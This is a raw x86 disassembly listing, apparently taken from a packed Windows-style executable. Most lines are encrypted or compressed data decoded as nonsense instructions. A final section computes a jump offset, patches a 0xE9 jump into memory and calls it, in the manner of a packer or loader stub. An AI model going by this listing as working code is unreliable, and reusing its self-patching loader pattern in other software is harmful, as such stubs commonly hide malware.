  41d630:	sub    dh,BYTE PTR [ebx+eax*1-0x7e498a82]
  41d637:	(bad)  
  41d638:	ss mov ebp,0x5aac25e3
  41d63e:	mov    edi,DWORD PTR [ecx+0x43]
  41d641:	daa    
  41d642:	fs clc 
  41d644:	sub    BYTE PTR [ebx+0x0],dl
  41d647:	loop   0x41d685
  41d649:	clc    
  41d64a:	sahf   
  41d64b:	push   esi
  41d64c:	mov    WORD PTR [edx-0x7f551128],?
  41d652:	xlat   BYTE PTR ds:[ebx]
  41d653:	repz mov ss,esi
  41d656:	fld    st(5)
  41d658:	fadd   st(2),st
  41d65a:	js     0x41d6aa
  41d65c:	dec    ecx
  41d65d:	cld    
  41d65e:	add    dl,BYTE PTR [ebx+0x42f62ce0]
  41d664:	(bad)  
  41d665:	addr16 xchg esp,eax
  41d667:	mov    ecx,0x2242e1c7
  41d66c:	(bad)  
  41d66d:	in     al,0x3a
  41d66f:	nop
  41d670:	jo     0x41d67e
  41d672:	or     bh,BYTE PTR [edx-0x3165cd75]
  41d678:	or     BYTE PTR [ebx+eiz*4+0x38a90ed8],cl
  41d67f:	fcomp  QWORD PTR [esi+esi*8+0x64]
  41d683:	jmp    0x94364ee4
  41d688:	and    dl,BYTE PTR [esi]
  41d68a:	mov    ds:0x3736e448,eax
  41d68f:	lock dec eax
  41d691:	xchg   edi,eax
  41d692:	addr16 add al,0x42
  41d695:	mov    fs,WORD PTR [edx]
  41d697:	push   ecx
  41d698:	pop    es
  41d699:	add    ch,bl
  41d69b:	sub    al,0x63
  41d69d:	xor    BYTE PTR [edx+0x70],0x51
  41d6a1:	mov    bh,0x9f
  41d6a3:	or     eax,0x1dad4d71
  41d6a8:	sahf   
  41d6a9:	push   eax
  41d6aa:	jno    0x41d63b
  41d6ac:	lock mov esp,0xfa919d29
  41d6b2:	jae    0x41d6ef
  41d6b4:	cmp    DWORD PTR [ebx-0x57],eax
  41d6b7:	stos   DWORD PTR es:[edi],eax
  41d6b8:	dec    ebx
  41d6b9:	sbb    DWORD PTR [edx+0x4e8aaff6],edx
  41d6bf:	xor    al,0x4c
  41d6c1:	sub    ch,ah
  41d6c3:	lods   eax,DWORD PTR ds:[esi]
  41d6c4:	pop    ds
  41d6c5:	push   ebx
  41d6c6:	mov    esi,0x4950106a
  41d6cb:	imul   edi,edx,0xc5af77d7
  41d6d1:	rcr    BYTE PTR [ebx+esi*2-0x6e],cl
  41d6d5:	xchg   ebx,eax
  41d6d6:	jge    0x41d675
  41d6d8:	xchg   esi,eax
  41d6d9:	cwde   
  41d6da:	out    dx,eax
  41d6db:	mov    al,0x51
  41d6dd:	pop    esi
  41d6de:	mov    dh,0x73
  41d6e0:	out    dx,eax
  41d6e1:	mov    ds:0x48dbca6d,al
  41d6e6:	cmp    al,0xaf
  41d6e8:	push   edx
  41d6e9:	test   al,0x6
  41d6eb:	in     eax,0x89
  41d6ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ee:	xchg   dl,al
  41d6f0:	pop    ss
  41d6f1:	inc    esp
  41d6f2:	sub    BYTE PTR [eax+ecx*2+0x44],cl
  41d6f6:	cmp    bl,ah
  41d6f8:	inc    esi
  41d6f9:	rcl    dh,cl
  41d6fb:	xchg   ebx,eax
  41d6fc:	in     eax,0xc7
  41d6fe:	push   cs
  41d6ff:	rcr    BYTE PTR [ecx+0x427c6023],0x26
  41d706:	xor    al,0xcb
  41d708:	test   eax,0xdcc5ab1e
  41d70d:	dec    ebp
  41d70e:	aas    
  41d70f:	adc    dh,ah
  41d711:	fs retf 
  41d713:	call   0xd6a9baea
  41d718:	jb     0x41d765
  41d71a:	in     eax,dx
  41d71b:	mov    cl,0xb5
  41d71d:	outs   dx,BYTE PTR ds:[esi]
  41d71e:	mov    dl,0x8f
  41d720:	add    bl,dl
  41d722:	cli    
  41d723:	fdiv   DWORD PTR [esi-0x29]
  41d726:	dec    edi
  41d727:	sti    
  41d728:	repnz cmp eax,0x8a6d6744
  41d72e:	aam    0xa4
  41d730:	pop    ebx
  41d731:	adc    BYTE PTR [ebx-0x58],al
  41d734:	mov    gs:0x51cacba8,al
  41d73a:	cmp    al,BYTE PTR [esi-0x44a46504]
  41d740:	inc    ebp
  41d741:	ret    0x15f5
  41d744:	xchg   edx,eax
  41d745:	mov    esp,0x3aed2681
  41d74a:	or     dl,BYTE PTR [eax]
  41d74c:	push   ds
  41d74d:	in     eax,0x89
  41d74f:	xor    cl,BYTE PTR [edx+0x18]
  41d752:	(bad)  
  41d753:	xchg   ebp,eax
  41d754:	mov    eax,ds:0x6524001a
  41d759:	call   0xc14c57bd
  41d75e:	in     eax,0xb8
  41d760:	ins    BYTE PTR es:[edi],dx
  41d761:	popf   
  41d762:	iret   
  41d763:	inc    esp
  41d764:	cmp    BYTE PTR [edx],bl
  41d766:	inc    edi
  41d767:	jb     0x41d6f8
  41d769:	xor    ebx,0x57
  41d76c:	stos   DWORD PTR es:[edi],eax
  41d76d:	je     0x41d728
  41d76f:	mov    bh,0xec
  41d771:	fld    DWORD PTR [ecx]
  41d773:	and    BYTE PTR [esi],ah
  41d775:	in     al,dx
  41d776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d777:	pop    esi
  41d778:	(bad)  
  41d779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d77a:	xor    DWORD PTR [edi-0x40],ecx
  41d77d:	pop    ss
  41d77e:	mov    ah,0x4e
  41d780:	dec    dl
  41d782:	iret   
  41d783:	loope  0x41d7cf
  41d785:	pop    esi
  41d786:	stc    
  41d787:	addr16 clc 
  41d789:	and    BYTE PTR [esi+eiz*1],bl
  41d78c:	adc    DWORD PTR [ecx+edx*8+0x74332985],eax
  41d793:	(bad)  
  41d794:	in     al,dx
  41d795:	inc    ecx
  41d796:	mov    dh,0x2e
  41d798:	lea    ebx,[edi+ebp*8+0x60fe2b8]
  41d79f:	xchg   esi,eax
  41d7a0:	dec    ecx
  41d7a1:	mov    edi,0x72fddbcd
  41d7a6:	pusha  
  41d7a7:	lahf   
  41d7a8:	xor    eax,0x5befbcfe
  41d7ad:	int3   
  41d7ae:	fcmove st,st(5)
  41d7b0:	pusha  
  41d7b1:	xor    al,0xdd
  41d7b3:	xchg   ecx,eax
  41d7b4:	jae    0x41d754
  41d7b6:	push   ebp
  41d7b7:	rcr    DWORD PTR [ebx],cl
  41d7b9:	push   es
  41d7ba:	xlat   BYTE PTR ds:[ebx]
  41d7bb:	aam    0xd3
  41d7bd:	mov    edx,DWORD PTR [ebx+esi*8+0x37cb20eb]
  41d7c4:	adc    DWORD PTR [esi+0x4a],0x23
  41d7c8:	push   esi
  41d7c9:	and    dl,BYTE PTR [ebp-0x28c9115d]
  41d7cf:	imul   ecx,ecx,0x67
  41d7d2:	mov    bp,0xedf0
  41d7d6:	xor    edi,esp
  41d7d8:	dec    esp
  41d7d9:	add    eax,0xb59cd811
  41d7de:	pop    edx
  41d7df:	mov    cl,0xb9
  41d7e1:	pop    eax
  41d7e2:	mov    bl,0x7e
  41d7e4:	sub    BYTE PTR [esi+0x65],0x55
  41d7e8:	jnp    0x41d840
  41d7ea:	adc    edi,DWORD PTR [ecx]
  41d7ec:	push   cs
  41d7ed:	aaa    
  41d7ee:	ss cwde 
  41d7f0:	cmp    al,ch
  41d7f2:	nop
  41d7f3:	mov    BYTE PTR [edi+0x3bdb40ce],cl
  41d7f9:	add    al,0x78
  41d7fb:	mov    ebp,0x14efc200
  41d800:	sub    ah,al
  41d802:	push   edx
  41d803:	out    dx,al
  41d804:	and    edi,esp
  41d806:	push   cs
  41d807:	icebp  
  41d808:	or     al,0x7b
  41d80a:	push   ebp
  41d80b:	push   0x2fe10855
  41d810:	imul   esp,DWORD PTR [ebx],0x761f031a
  41d816:	faddp  st(6),st
  41d818:	into   
  41d819:	sbb    al,0x3a
  41d81b:	aad    0x4b
  41d81d:	pcmpgtb mm7,QWORD PTR [ebx+0x7f04411]
  41d824:	inc    ebp
  41d825:	fimul  WORD PTR [ebx+0x6c]
  41d828:	push   cs
  41d829:	cmp    DWORD PTR [edi],0xfffffff7
  41d82c:	int    0x5c
  41d82e:	imul   esi,DWORD PTR [ebx-0x25],0xc2a4afa3
  41d835:	sbb    ah,ah
  41d837:	push   0x621e9008
  41d83c:	test   ah,bl
  41d83e:	test   eax,ebx
  41d840:	out    dx,eax
  41d841:	int    0xd5
  41d843:	call   0xc8ff7939
  41d848:	loopne 0x41d826
  41d84a:	inc    edi
  41d84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d84c:	xchg   esi,eax
  41d84d:	imul   eax,edi,0x516eb094
  41d853:	shr    BYTE PTR [ebp-0x6a3b0ed4],cl
  41d859:	jmp    0x368a:0xca46aae1
  41d860:	cwde   
  41d861:	fwait
  41d862:	rol    BYTE PTR [ebx+0x7598db6f],cl
  41d868:	inc    edx
  41d869:	jecxz  0x41d7f7
  41d86b:	cli    
  41d86c:	nop
  41d86d:	pop    edi
  41d86e:	dec    edx
  41d86f:	pop    edi
  41d870:	xor    al,0xef
  41d872:	push   esi
  41d874:	mov    es,edx
  41d876:	xchg   esp,eax
  41d877:	jns    0x41d8ec
  41d879:	or     dh,dh
  41d87b:	or     bh,cl
  41d87d:	in     al,dx
  41d87e:	popf   
  41d87f:	cmp    BYTE PTR [edi-0x7db05c9e],0x6b
  41d886:	adc    eax,0xed0dd723
  41d88b:	outs   dx,DWORD PTR ds:[esi]
  41d88c:	lock and esi,edx
  41d88f:	es aaa 
  41d891:	daa    
  41d892:	in     eax,0x76
  41d894:	sbb    esp,DWORD PTR [edi+eiz*2]
  41d897:	xchg   esp,eax
  41d898:	loop   0x41d8bd
  41d89a:	icebp  
  41d89b:	cmp    DWORD PTR [edi-0x7592a16b],ebp
  41d8a1:	out    0x91,eax
  41d8a3:	clc    
  41d8a4:	ds adc esi,eax
  41d8a7:	push   ebx
  41d8a8:	ret    
  41d8a9:	mov    ah,0x2e
  41d8ab:	xchg   edx,eax
  41d8ac:	(bad)  
  41d8ad:	shl    BYTE PTR [ebx-0x2b],1
  41d8b0:	pop    ebx
  41d8b1:	and    eax,0x9cdbc2ee
  41d8b6:	and    ebx,ebx
  41d8b8:	pop    ecx
  41d8b9:	enter  0x4482,0x25
  41d8bd:	cmp    ch,BYTE PTR [edx+0x1b22bd95]
  41d8c3:	pop    edx
  41d8c4:	add    dh,bl
  41d8c6:	sub    dl,ch
  41d8c8:	jne    0x41d858
  41d8ca:	inc    esi
  41d8cb:	icebp  
  41d8cc:	dec    ebp
  41d8cd:	mov    ebp,0x62a3f73e
  41d8d2:	in     al,0xcc
  41d8d4:	jae    0x41d947
  41d8d6:	int3   
  41d8d7:	sti    
  41d8d8:	mov    ebp,0xdf526234
  41d8dd:	test   DWORD PTR [edx],ebp
  41d8df:	dec    edi
  41d8e0:	(bad)
  41d8e3:	xlat   BYTE PTR ds:[ebx]
  41d8e4:	adc    edx,0xfa0467f0
  41d8ea:	inc    ebp
  41d8eb:	lods   eax,DWORD PTR ds:[esi]
  41d8ec:	int    0x91
  41d8ee:	xor    cl,BYTE PTR [eax+0x12]
  41d8f1:	jp     0x41d8ff
  41d8f3:	mov    bl,BYTE PTR [ebp-0x17]
  41d8f6:	fist   DWORD PTR [esi+ebp*8+0x19fadea6]
  41d8fd:	inc    esp
  41d8fe:	ds or  eax,0xd07bdaf
  41d904:	call   0x3031be71
  41d909:	test   al,0xce
  41d90b:	lahf   
  41d90c:	arpl   WORD PTR [ecx-0x26e80ef8],sp
  41d912:	iret   
  41d913:	sub    ch,al
  41d915:	mov    dh,0x13
  41d917:	adc    al,0xf
  41d919:	add    BYTE PTR [edx-0x7e602558],ch
  41d91f:	inc    edx
  41d920:	and    ecx,DWORD PTR [ecx+0x22ea911b]
  41d926:	(bad)  [edx]
  41d928:	xchg   BYTE PTR fs:[edi-0x565c8da2],al
  41d92f:	jno    0x41d94b
  41d931:	enter  0xb09d,0xc2
  41d935:	mov    al,ds:0x5c84fa6
  41d93a:	add    DWORD PTR [ebp+eax*1-0x61],eax
  41d93e:	gs stos DWORD PTR es:[edi],eax
  41d940:	xchg   edx,eax
  41d941:	call   0x29e1:0x9b01d722
  41d948:	icebp  
  41d949:	xor    DWORD PTR [ebp+0x1e],0xffffffde
  41d94d:	ss xor al,0x55
  41d950:	xchg   edx,eax
  41d951:	mov    esi,0x16d3c62e
  41d956:	dec    ecx
  41d957:	ret    
  41d958:	imul   ebx,DWORD PTR [ebx],0x23574cd4
  41d95e:	ss or  eax,0x9765f059
  41d964:	(bad)  
  41d966:	div    BYTE PTR [ebx]
  41d968:	mov    bl,BYTE PTR [ebp-0x2451c709]
  41d96e:	xlat   BYTE PTR ds:[ebx]
  41d96f:	inc    eax
  41d970:	pop    esp
  41d971:	lock iret 
  41d973:	add    bh,BYTE PTR [edi+0x25]
  41d976:	push   cs
  41d977:	adc    dh,ch
  41d979:	sbb    eax,0xcdb20e99
  41d97e:	(bad)  
  41d980:	retf   0xd017
  41d983:	loopne 0x41d905
  41d985:	cmp    DWORD PTR [edi+0xc],ebx
  41d988:	std    
  41d989:	add    BYTE PTR [ebx],ch
  41d98b:	mov    esi,0x2670f8b3
  41d990:	loope  0x41d9c6
  41d992:	xchg   BYTE PTR [eax+ebp*8-0x6546b4dd],ch
  41d999:	jne    0x41d956
  41d99b:	inc    eax
  41d99c:	cdq    
  41d99d:	adc    dl,bl
  41d99f:	out    dx,eax
  41d9a0:	inc    ebp
  41d9a1:	jge    0x41d94c
  41d9a3:	les    ebx,FWORD PTR [esp+eax*8]
  41d9a6:	fadd   st(6),st
  41d9a8:	sub    BYTE PTR [edx],0xb8
  41d9ab:	and    eax,0xb181563f
  41d9b0:	(bad)  
  41d9b1:	hlt    
  41d9b2:	(bad)  
  41d9b3:	call   0x35101af8
  41d9b8:	push   esp
  41d9b9:	(bad)  
  41d9ba:	cmc    
  41d9bb:	into   
  41d9bc:	mov    ds:0x8c2c7587,al
  41d9c1:	jnp    0x41d9ba
  41d9c3:	fistp  WORD PTR [eax+ecx*1-0x789a19af]
  41d9ca:	sti    
  41d9cb:	fisubr WORD PTR [eax+0x34]
  41d9ce:	and    al,0x6
  41d9d0:	sar    DWORD PTR [ebx-0x1b],0x6
  41d9d4:	ja     0x41d969
  41d9d6:	mov    edi,ebp
  41d9d8:	adc    DWORD PTR [ecx-0x3ba84797],edx
  41d9de:	xchg   DWORD PTR [eax+0x7d7199c2],edi
  41d9e4:	sub    al,0xe2
  41d9e6:	cs icebp 
  41d9e8:	dec    ecx
  41d9e9:	pushf  
  41d9ea:	cmp    eax,0x30d80efb
  41d9ef:	popf   
  41d9f0:	and    BYTE PTR [ebp+0xb],ah
  41d9f3:	dec    edx
  41d9f4:	xor    DWORD PTR [ecx],ebx
  41d9f6:	sub    eax,0xffffff98
  41d9f9:	(bad)  
  41d9fa:	xchg   edi,eax
  41d9fb:	aas    
  41d9fc:	sbb    al,0xcc
  41d9fe:	stos   BYTE PTR es:[edi],al
  41d9ff:	dec    esp
  41da00:	add    dh,0x9a
  41da03:	in     al,0xc8
  41da05:	push   ds
  41da06:	or     DWORD PTR [ebx+0x31],0xb40e9f57
  41da0d:	jb     0x41da76
  41da0f:	ja     0x41d997
  41da11:	pop    es
  41da12:	in     eax,0xf1
  41da14:	jmp    0xb9b0:0xaad5b44b
  41da1b:	pop    ebp
  41da1c:	(bad)  
  41da1d:	sahf   
  41da1e:	push   ss
  41da1f:	jmp    0x41d9ad
  41da21:	xlat   BYTE PTR ds:[ebx]
  41da22:	xchg   esp,eax
  41da23:	cmp    bl,BYTE PTR [edx+0x57]
  41da26:	pushf  
  41da27:	dec    esp
  41da28:	sub    ecx,eax
  41da2a:	mov    ah,al
  41da2c:	sbb    BYTE PTR [edx],0xc8
  41da2f:	or     DWORD PTR [ebx+ecx*1-0x6c],0x4c
  41da34:	(bad)
  41da37:	sbb    ch,BYTE PTR [edx+ebx*4+0x10]
  41da3b:	fstp   QWORD PTR ds:[ecx]
  41da3e:	push   eax
  41da3f:	xor    DWORD PTR [ebx],ebx
  41da41:	or     DWORD PTR [edx+0x78],ebp
  41da44:	sbb    ch,BYTE PTR [eax+0x64266323]
  41da4a:	jl     0x41dab2
  41da4c:	clc    
  41da4d:	add    al,0x7e
  41da4f:	bound  edx,QWORD PTR [eax+0x7b]
  41da52:	stos   BYTE PTR es:[edi],al
  41da53:	fsubp  st(5),st
  41da55:	cmp    al,0xed
  41da57:	jno    0x41da67
  41da59:	aaa    
  41da5a:	cli    
  41da5b:	ins    BYTE PTR es:[edi],dx
  41da5c:	adc    dh,BYTE PTR [eax]
  41da5e:	push   ecx
  41da5f:	push   cs
  41da60:	pushf  
  41da61:	adc    DWORD PTR [eax+ecx*1+0x5d020734],ebx
  41da68:	pop    ebx
  41da69:	dec    ecx
  41da6a:	pushf  
  41da6b:	lods   eax,DWORD PTR ds:[esi]
  41da6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da6d:	xlat   BYTE PTR ds:[ebx]
  41da6e:	jno    0x41da57
  41da70:	pop    eax
  41da72:	jns    0x41da95
  41da74:	dec    esi
  41da75:	imul   ebp,DWORD PTR [ebx+ebp*4+0x3c912e3e],0xf8fecd34
  41da80:	ret    
  41da81:	jmp    0x8d89:0xc1b53158
  41da88:	add    DWORD PTR [edi+0x420c6cd4],ebx
  41da8e:	push   ecx
  41da8f:	test   cl,0xa9
  41da92:	js     0x41daa1
  41da94:	add    eax,0xed809ed1
  41da99:	addr16 (bad) 
  41da9b:	dec    esi
  41da9c:	pushf  
  41da9d:	jo     0x41db07
  41da9f:	in     al,0x5c
  41daa1:	sbb    DWORD PTR [edi-0x12],eax
  41daa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daa5:	pop    ecx
  41daa6:	fwait
  41daa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daa8:	fwait
  41daa9:	cmc    
  41daaa:	cli    
  41daab:	mov    edi,ebp
  41daad:	outs   dx,DWORD PTR ds:[esi]
  41daae:	ja     0x41da7c
  41dab0:	and    ebx,0xffffff83
  41dab3:	das    
  41dab4:	and    DWORD PTR [ebp+0x77e20109],ebx
  41daba:	sub    DWORD PTR [ecx+ebp*1],ebx
  41dabd:	fwait
  41dabe:	inc    ebp
  41dabf:	inc    edi
  41dac0:	pop    ss
  41dac1:	dec    ebp
  41dac2:	push   es
  41dac3:	clc    
  41dac4:	test   BYTE PTR [esp-0x2943667d],0xa9
  41dacc:	stos   DWORD PTR es:[edi],eax
  41dacd:	ret    0x4b57
  41dad0:	(bad)  
  41dad1:	call   0x342e22fc
  41dad6:	push   cs
  41dad7:	jb     0x41db11
  41dad9:	repnz pop bp
  41dadc:	xlat   BYTE PTR ds:[ebx]
  41dadd:	frstor cs:[edx-0x4a099e6d]
  41dae4:	xor    ah,al
  41dae6:	adc    cl,BYTE PTR [ebx-0x1e]
  41dae9:	in     eax,dx
  41daea:	ins    BYTE PTR es:[edi],dx
  41daeb:	or     eax,0x49402316
  41daf0:	mov    bh,BYTE PTR [edx+0x49be3f]
  41daf6:	mov    ch,0xd4
  41daf8:	(bad)  
  41daf9:	pop    esi
  41dafa:	jns    0x41db43
  41dafc:	cmp    BYTE PTR [edi],0x8d
  41daff:	cmp    BYTE PTR [edi],0xe7
  41db02:	sub    eax,0xa9ae67d9
  41db07:	and    esi,DWORD PTR [edi]
  41db09:	adc    al,0x3f
  41db0b:	mov    bh,0x2
  41db0d:	fsubrp st(3),st
  41db0f:	mov    ds:0x9f9d0932,al
  41db14:	mov    ebx,0x23a9ab08
  41db19:	icebp  
  41db1a:	retf   0x7cd8
  41db1d:	xor    esp,ebp
  41db1f:	loop   0x41db2d
  41db21:	sbb    al,0x70
  41db23:	rol    ebx,0x4a
  41db26:	jmp    0x1ff5a4bb
  41db2b:	cmp    al,0xdc
  41db2d:	adc    esp,eax
  41db2f:	lock cwde 
  41db31:	pop    ss
  41db32:	push   0xda5d47d5
  41db37:	outs   dx,BYTE PTR ds:[esi]
  41db38:	pop    ebp
  41db39:	xor    al,0x79
  41db3b:	xor    BYTE PTR [ebx+eiz*2-0x374b8277],0x48
  41db43:	dec    esp
  41db44:	in     eax,0x98
  41db46:	jle    0x41db80
  41db48:	or     BYTE PTR [ebx],bl
  41db4a:	lea    ecx,[ebx-0x3756cd89]
  41db50:	cmc    
  41db51:	add    BYTE PTR [ecx],dh
  41db53:	stc    
  41db54:	mov    ecx,0x3f85c3de
  41db59:	pop    edi
  41db5a:	jecxz  0x41db54
  41db5c:	add    edx,DWORD PTR [ebp+0x21b20d40]
  41db62:	xchg   ebp,eax
  41db63:	fcomp  DWORD PTR [edx+esi*8]
  41db66:	into   
  41db67:	or     ebx,ecx
  41db69:	xchg   esp,eax
  41db6a:	cmp    esi,DWORD PTR [eax-0x2c81d165]
  41db70:	into   
  41db71:	jnp    0x41db75
  41db73:	xor    esp,eax
  41db75:	imul   DWORD PTR [esp+edi*2+0x70]
  41db79:	sub    esp,DWORD PTR [ecx-0x62f94a38]
  41db7f:	xchg   esi,eax
  41db80:	or     al,BYTE PTR [edi+0x14907053]
  41db86:	jge    0x41db73
  41db88:	rcr    ch,cl
  41db8a:	sub    BYTE PTR [ebx-0x79c43cb5],bl
  41db90:	mov    al,ds:0x8121676
  41db95:	mov    cl,BYTE PTR [eax-0x7a]
  41db98:	(bad)  
  41db99:	lahf   
  41db9a:	mov    ch,0x94
  41db9c:	pop    edx
  41db9d:	ins    BYTE PTR es:[edi],dx
  41db9e:	adc    eax,0x6bfef475
  41dba3:	(bad)  
  41dba5:	push   cs
  41dba6:	aaa    
  41dba7:	inc    esi
  41dba8:	mov    eax,0x1da2ca9d
  41dbad:	xchg   esp,eax
  41dbae:	push   ds
  41dbaf:	lahf   
  41dbb0:	lods   al,BYTE PTR ds:[esi]
  41dbb1:	jg     0x41db8f
  41dbb3:	inc    ecx
  41dbb4:	adc    BYTE PTR [edi+ebp*2+0x3ad8c4f8],0x1c
  41dbbc:	cmp    DWORD PTR [ebx+0x5b],0xb4f2119f
  41dbc3:	xor    ebx,DWORD PTR [edx-0xa]
  41dbc6:	mov    dh,0x1c
  41dbc8:	xchg   BYTE PTR [edi],ch
  41dbca:	push   edi
  41dbcb:	mov    edi,0xea408899
  41dbd0:	sbb    al,0x8f
  41dbd2:	jae    0x41dba2
  41dbd4:	jnp    0x41dbcc
  41dbd6:	repnz sti 
  41dbd8:	into   
  41dbd9:	sub    DWORD PTR [esi+0x5e],0xffffffb9
  41dbdd:	xor    DWORD PTR [edi+0x71ec2b32],eax
  41dbe3:	pop    ds
  41dbe4:	push   0x8643aed3
  41dbe9:	jmp    0x41dc5b
  41dbeb:	inc    esi
  41dbec:	ins    DWORD PTR es:[edi],dx
  41dbed:	fadd   DWORD PTR [ecx+0x6]
  41dbf0:	in     eax,0xaf
  41dbf2:	xchg   edx,eax
  41dbf3:	loop   0x41dc23
  41dbf5:	ins    DWORD PTR es:[edi],dx
  41dbf6:	test   BYTE PTR [esi+0x2e],0xb6
  41dbfa:	sbb    ecx,esi
  41dbfc:	das    
  41dbfd:	push   0xec6809be
  41dc02:	in     al,0x2e
  41dc04:	stos   DWORD PTR es:[edi],eax
  41dc05:	xlat   BYTE PTR ds:[ebx]
  41dc06:	add    al,0x4c
  41dc08:	add    cl,cl
  41dc0a:	xor    BYTE PTR [edi-0x6a],0xc7
  41dc0e:	psrlq  mm0,QWORD PTR [eax-0x50ab60bc]
  41dc15:	into   
  41dc16:	push   ecx
  41dc17:	(bad)  
  41dc18:	xchg   ecx,eax
  41dc19:	adc    BYTE PTR [ebp-0x447457a0],bl
  41dc1f:	pusha  
  41dc20:	sbb    al,0xfe
  41dc22:	jo     0x41dbdf
  41dc24:	push   edx
  41dc25:	std    
  41dc26:	outs   dx,DWORD PTR ds:[esi]
  41dc27:	jge    0x41dbd6
  41dc29:	fcmovbe st,st(6)
  41dc2b:	xor    edx,ebx
  41dc2d:	jae    0x41dc97
  41dc2f:	or     dh,dh
  41dc31:	shl    DWORD PTR [esi+edx*4],0x60
  41dc35:	mov    bh,0x9a
  41dc37:	lods   al,BYTE PTR ds:[esi]
  41dc38:	dec    eax
  41dc39:	sbb    DWORD PTR [eax],edx
  41dc3b:	xor    cl,BYTE PTR [eax-0x16]
  41dc3e:	or     ebx,edx
  41dc40:	dec    edi
  41dc41:	ds jmp 0x4a5c902f
  41dc47:	sbb    DWORD PTR [ebx],eax
  41dc49:	sub    al,BYTE PTR [ebx-0xb]
  41dc4c:	mov    WORD PTR [edi],fs
  41dc4e:	pop    ebx
  41dc4f:	(bad)  
  41dc50:	pop    edx
  41dc51:	pcmpeqb mm3,QWORD PTR [ebp-0x106e9390]
  41dc58:	or     esp,esi
  41dc5a:	dec    edi
  41dc5b:	stc    
  41dc5c:	or     ch,BYTE PTR [ebp+0x5a866cfe]
  41dc62:	jae    0x41dc15
  41dc64:	push   ebx
  41dc65:	fisubr WORD PTR [ebx+0x6]
  41dc68:	push   cs
  41dc69:	inc    esp
  41dc6a:	sub    eax,0x55942c82
  41dc6f:	sbb    cl,ah
  41dc71:	mov    ?,WORD PTR [edi+0x4071eed]
  41dc77:	or     ah,dl
  41dc79:	jns    0x41dc81
  41dc7b:	out    0x37,eax
  41dc7d:	pop    es
  41dc7e:	add    DWORD PTR [esi-0x5a],ebx
  41dc81:	mov    ds:0x12c95e7,al
  41dc86:	cld    
  41dc87:	pusha  
  41dc88:	mov    eax,0x654efc99
  41dc8d:	fimul  WORD PTR [ebp+0x3bf70cc7]
  41dc93:	test   DWORD PTR ds:0x486984a,esp
  41dc99:	sbb    dl,bh
  41dc9b:	sub    DWORD PTR [esi-0x63],edx
  41dc9e:	mov    eax,0xd5b9fafd
  41dca3:	shr    DWORD PTR [esi-0x3936f10a],cl
  41dca9:	sbb    dl,dh
  41dcab:	dec    ebp
  41dcac:	repnz dec ebp
  41dcae:	mov    ebx,0xabc22962
  41dcb3:	or     BYTE PTR [esi],bh
  41dcb5:	cwde   
  41dcb6:	ret    0xe08d
  41dcb9:	mov    dl,0xef
  41dcbb:	adc    al,0x3e
  41dcbd:	inc    edx
  41dcbe:	into   
  41dcbf:	inc    eax
  41dcc0:	popa   
  41dcc1:	pop    ecx
  41dcc2:	iret   
  41dcc3:	inc    eax
  41dcc4:	adc    DWORD PTR [eax],esp
  41dcc6:	int3   
  41dcc7:	pop    ecx
  41dcc8:	loope  0x41dc4c
  41dcca:	aad    0x70
  41dccc:	add    BYTE PTR [edi-0xf],cl
  41dccf:	mov    esi,0x20452163
  41dcd4:	popa   
  41dcd5:	push   es
  41dcd6:	jbe    0x41dd4e
  41dcd8:	mov    BYTE PTR [edx-0x1f],dh
  41dcdb:	out    0x94,eax
  41dcdd:	pushf  
  41dcde:	and    DWORD PTR [esi+0x6b577dd7],eax
  41dce4:	mov    dh,0xba
  41dce6:	sub    eax,0xe811c98b
  41dceb:	jno    0x41dc7e
  41dced:	ds ret 
  41dcef:	pop    eax
  41dcf0:	(bad)  
  41dcf1:	adc    bh,BYTE PTR ds:0x3a9345d
  41dcf7:	xor    DWORD PTR [edi-0x3f7afc9a],0x62840f
  41dd01:	add    BYTE PTR [eax],al
  41dd03:	lea    eax,[ebp-0x8]
  41dd06:	mov    DWORD PTR [ebp-0x34],eax
  41dd09:	mov    eax,DWORD PTR [ebp-0x30]
  41dd0c:	mov    DWORD PTR [ebp-0x8],eax
  41dd0f:	mov    eax,DWORD PTR [ebp-0x8]
  41dd12:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd15:	sub    eax,ecx
  41dd17:	mov    DWORD PTR [ebp-0x8],eax
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x4]
  41dd1d:	xor    ecx,esi
  41dd1f:	mov    eax,0xffcd8d11
  41dd24:	sub    eax,ecx
  41dd26:	add    DWORD PTR [ebp-0x8],eax
  41dd29:	mov    eax,DWORD PTR [ebp-0x8]
  41dd2c:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd2f:	mov    DWORD PTR [ecx+0x1],eax
  41dd32:	mov    eax,DWORD PTR [ebp-0x14]
  41dd35:	push   DWORD PTR [ebp-0x24]
  41dd38:	mov    BYTE PTR [eax],0xe9
  41dd3b:	mov    eax,ds:0x42929a
  41dd40:	push   DWORD PTR [eax]
  41dd42:	push   DWORD PTR ds:0x4294fe
  41dd48:	push   DWORD PTR ds:0x4292a2
  41dd4e:	push   DWORD PTR ds:0x4294de
  41dd54:	push   DWORD PTR ds:0x42a18a
  41dd5a:	push   DWORD PTR [ebp-0x28]
  41dd5d:	push   DWORD PTR [ebp-0x2c]
  41dd60:	mov    eax,DWORD PTR [ebp-0x14]
  41dd63:	call   eax
  41dd65:	pop    edi
  41dd66:	pop    esi
  41dd67:	leave  
  41dd68:	ret    
  41dd69:	push   ebp
  41dd6a:	mov    ebp,esp
  41dd6c:	sub    esp,0x1c
  41dd6f:	adc    DWORD PTR ds:0x42a43a,0x3656
  41dd79:	mov    DWORD PTR [ebp-0x10],0xf89f85b9
  41dd80:	lea    eax,[ebp+0x14]
  41dd83:	or     edx,edx
  41dd85:	mov    DWORD PTR [ebp-0x4],eax
  41dd88:	xor    edx,0xd6f
  41dd8e:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41dd95:	lea    eax,[ebp-0xc]
  41dd98:	and    DWORD PTR ds:0x42a40a,0x0
  41dda2:	jmp    0x41ddb4
  41dda7:	mov    edx,DWORD PTR ds:0x42a40a
  41ddad:	inc    edx
  41ddae:	mov    DWORD PTR ds:0x42a40a,edx
  41ddb4:	cmp    DWORD PTR ds:0x42a40a,0x16
  41ddbb:	jae    0x41de02
